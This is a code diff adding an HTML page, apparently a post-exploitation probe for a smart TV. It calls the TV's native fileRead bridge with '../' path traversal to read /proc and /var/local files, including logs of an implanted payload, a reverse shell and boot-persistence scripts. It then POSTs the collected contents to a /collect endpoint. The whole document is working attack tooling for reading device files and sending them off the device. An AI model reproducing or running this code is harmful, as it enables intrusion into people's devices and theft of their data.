@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>alvidaa after-boot</title>
+<style>
+  html, body { margin: 0; padding: 0; background: #000; color: #ccc; }
+  #out { font: 18px/1.4 Menlo, Consolas, monospace; white-space: pre-wrap;
+         word-break: break-all; padding: 12px; }
+  .ok { color: #8f8; } .err { color: #f88; } .warn { color: #fd6; } .hdr { color: #6cf; }
+</style>
+</head>
+<body>
+<div id="out"></div>
+<script>
+(function () {
+  "use strict";
+  // READ-ONLY diagnostic for the cold-boot test. Nothing on the TV is written.
+  var el = document.getElementById("out");
+  function out(t, c) {
+    var d = document.createElement("div");
+    d.textContent = t;
+    if (c) d.className = c;
+    el.appendChild(d);
+  }
+
+  var PATHS = [
+    "../proc/uptime",
+    "../proc/sys/kernel/random/boot_id",
+    "../proc/mounts",
+    "../var/local/pfmParse",
+    "../var/local/pfmParse/PFMCheck",
+    "../var/local/pfmParse/Data",
+    "../var/local/pfmParse/Data/platform.txt",
+    "../var/local/DebugPowerup",
+    "../var/local/DebugPFM_Ctrl",
+    "../tmp/DebugPFM_Data",
+    "../var/local/alvidaa",
+    "../var/local/alvidaa/payload.log",
+    "../var/local/alvidaa/boot.log",
+    "../var/local/alvidaa/rshell.log",
+    "../var/local/alvidaa/proof.txt",
+    "../var/local/alvidaa/svc.sh",
+    "../var/local/alvidaa/boot.sh",
+    "../var/local/alpac-agent/boot-trigger"
+  ];
+
+  function norm(m) {
+    if (m == null) return "";
+    if (typeof m === "string") return m;
+    try { return JSON.stringify(m); } catch (e) { return String(m); }
+  }
+
+  function read(p) {
+    try {
+      if (typeof HiUtils_createRequest !== "function") return { ret: false, msg: "no bridge" };
+      var r = HiUtils_createRequest("fileRead", { path: [p], mode: 6 });
+      if (r && typeof r === "object") {
+        return { ret: r.ret, code: r.code, msg: norm(r.msg).slice(0, 200000) };
+      }
+      return { ret: true, msg: norm(r).slice(0, 200000) };
+    } catch (e) { return { ret: false, msg: "EXC " + e }; }
+  }
+
+  async function main() {
+    out("alvidaa after-boot probe — read only", "hdr");
+    var report = {
+      started: new Date().toISOString(),
+      ua: navigator.userAgent,
+      href: location.href,
+      files: {}
+    };
+    for (var i = 0; i < PATHS.length; i++) {
+      var p = PATHS[i];
+      var r = read(p);
+      report.files[p] = r;
+      var yes = r.ret === true && String(r.msg).length > 0;
+      out((yes ? "[OK] " : "[--] ") + p + "  " + String(r.msg).length + " chars",
+          yes ? "ok" : "warn");
+    }
+    out("");
+    out("uploading to /collect ...", "warn");
+    var res = "";
+    for (var a = 1; a <= 3; a++) {
+      try {
+        var x = await fetch("/collect", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(report)
+        });
+        res = "HTTP " + x.status;
+        if (x.ok) break;
+      } catch (e) { res = "EXC " + e; }
+      await new Promise(function (r) { setTimeout(r, 1200); });
+    }
+    out("upload: " + res, res === "HTTP 200" ? "ok" : "err");
+    out(res === "HTTP 200" ? "ГОТОВО — можно закрывать" : "НЕ УШЛО — скажи", 
+        res === "HTTP 200" ? "ok" : "err");
+  }
+
+  main().catch(function (e) { out("FATAL " + e, "err"); });
+})();
+</script>
+</body>
+</html>
